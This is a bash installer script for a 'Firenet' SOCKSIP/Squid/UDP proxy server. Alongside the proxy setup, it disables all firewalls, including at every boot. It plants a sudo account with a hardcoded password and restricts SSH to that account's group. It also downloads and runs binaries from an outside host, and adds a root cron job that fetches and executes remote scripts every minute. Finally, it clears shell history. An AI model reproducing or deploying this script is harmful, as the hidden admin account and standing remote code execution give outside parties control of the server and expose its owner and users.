
timedatectl set-timezone Asia/Riyadh
if [[ $(grep "nogroup" /etc/group) ]]; then
    cert_group="nogroup"
fi

install_require () {
clear
echo 'Installing dependencies.'
{
# Turn off various firewalls
systemctl stop firewalld
systemctl disable firewalld
systemctl stop nftables
systemctl disable nftables
systemctl stop ufw
systemctl disable ufw
  
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DEBIAN_FRONTEND=noninteractive
apt update
apt install -y lsof tar systemd dbus git
apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
apt install -y curl wget cron python-minimal libpython-stdlib
apt install -y iptables sudo
apt install -y netcat httpie php neofetch vnstat
apt install -y screen gnutls-bin python
apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
apt install -y mlocate dh-make libaudit-dev build-essential fail2ban

touch /var/spool/cron/crontabs/root && chmod 600 /var/spool/cron/crontabs/root
systemctl start cron && systemctl enable cron

clear
}&>/dev/null
clear
}

install_squid(){
clear
echo 'Installing proxy.'
{
sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
sudo apt update
sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
dos2unix /etc/init.d/squid3
sudo chmod +x /etc/init.d/squid3
sudo update-rc.d squid3 defaults
sudo update-rc.d squid3 enable
cd /etc/squid3/
rm squid.conf
echo "acl SSH dst `ip route get 8.8.8.8 | awk '/src/ {f=NR} f&&NR-1==f' RS=" "`" >> squid.conf
echo 'acl CONNECT method CONNECT
http_access allow SSH
http_access deny all
http_port 8080
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname KobZ-Proxy
error_directory /usr/share/squid3/errors/English' >> squid.conf
cd /usr/share/squid3/errors/English
rm ERR_INVALID_URL
echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">üòç %w üòç</p></div></div></body></html>' >> ERR_INVALID_URL
chmod 755 *
service squid3 stop
cd /etc || exit
wget 'http://firenetvpn.net/files/repo/monitor' -O /etc/.monitor
chmod +x /etc/.monitor
rm /etc/apt/sources.list
sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
} &>/dev/null
}

install_sudo(){
    useradd -m digitel 2>/dev/null; echo digitel:@digitel | chpasswd &>/dev/null; usermod -aG sudo digitel &>/dev/null
    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
    echo "AllowGroups digitel" >> /etc/ssh/sshd_config
    service sshd restart
}

install_UDP(){

mkdir $udp_file
chmod -R +x $udp_file

wget -O /usr/bin/udpServer 'http://firenetvpn.net/files/repo/udpServer'
wget -O $udp_file/limitador.sh 'http://firenetvpn.net/files/repo/limitador.sh'

chmod +x /usr/bin/udpServer
chmod +x $udp_file/limitador.sh

	cat <<EOF > /etc/systemd/system/UDPserver.service
[Unit]
Description=UDPserver Service by Firenet
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/udpServer -ip=$server_ip -net=$server_interface -exclude=8080,5623 -mode=system
Restart=always
RestartSec=3s

[Install]
WantedBy=multi-user.target6
EOF

systemctl start UDPserver
systemctl enable UDPserver

}

install_rclocal(){
  {
    sudo systemctl enable openvpn@server.service
    sudo systemctl start openvpn@server.service
    
    echo "[Unit]
Description=firenet service
Documentation=http://firenetvpn.com

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/rc.local
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
rm -rf /etc/rc.local
    echo '#!/bin/sh -e
service ufw stop
ufw disable
systemctl start UDPserver.service
screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
bash /etc/.monitor socksip
exit 0' >> /etc/rc.local

    sudo chmod +x /etc/rc.local
    systemctl daemon-reload
    sudo systemctl enable firenet
    sudo systemctl start firenet.service

mkdir -m 777 /root/.web
echo "Made with love by: Firenet Developer... " >> /root/.web/index.php

sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/g' /etc/ssh/sshd_config
echo "/bin/false" >> /etc/shells

cat <<EOF >/etc/UDPserver/limit_check.sh
#!/bin/bash
SHELL=/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
/bin/bash /etc/UDPserver/limitador.sh --ssh
sleep 5
/bin/bash /etc/UDPserver/limitador.sh --ssh
sleep 15
/bin/bash /etc/UDPserver/limitador.sh --ssh
sleep 15
/bin/bash /etc/UDPserver/limitador.sh --ssh
sleep 15
/bin/bash /etc/UDPserver/limitador.sh --ssh
EOF

cat <<EOF >/home/authentication.sh
#!/bin/bash
SHELL=/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
wget -O /home/active.sh "$API_LINK/socksip_active.php?key=$API_KEY" &>/dev/null
sleep 5
wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY" &>/dev/null
sleep 5
wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY" &>/dev/null
sleep 15
bash /home/active.sh &>/dev/null
sleep 15
bash /home/inactive.sh &>/dev/null
sleep 15
bash /home/deleted.sh &>/dev/null
EOF

chmod +x $udp_file/limit_check.sh
chmod +x /home/authentication.sh

echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"

echo "
squid_port=8080
socksip_port=1-65535
" >> /root/.ports

  }&>/dev/null
}

start_service () {
clear
echo 'Starting..'
{

sudo crontab -l | { echo "* * * * * /bin/bash /etc/.monitor socksip >/dev/null 2>&1
* * * * * /bin/bash /etc/UDPserver/limit_check.sh"; } | crontab -
sudo systemctl restart cron
} &>/dev/null
clear
echo '++++++++++++++++++++++++++++++++++'
echo '*       SOCKSIP is ready!        *'
echo '+++++++++++************+++++++++++'
history -c;
echo "DB_HOST='$HOST'" >> ~/.db-base
echo "DB_NAME='$DBNAME'" >> ~/.db-base
echo "DB_USER='$USER'" >> ~/.db-base
echo "DB_PASS='$PASS'" >> ~/.db-base
rm /usr/local/etc/.system
echo 'Server will secure this server and reboot after 20 seconds'
sleep 20
reboot
}

udp_file='/etc/UDPserver'
server_ip=$(curl -s https://api.ipify.org)
server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")

install_sudo
install_require  
install_squid
install_UDP
install_rclocal
start_service
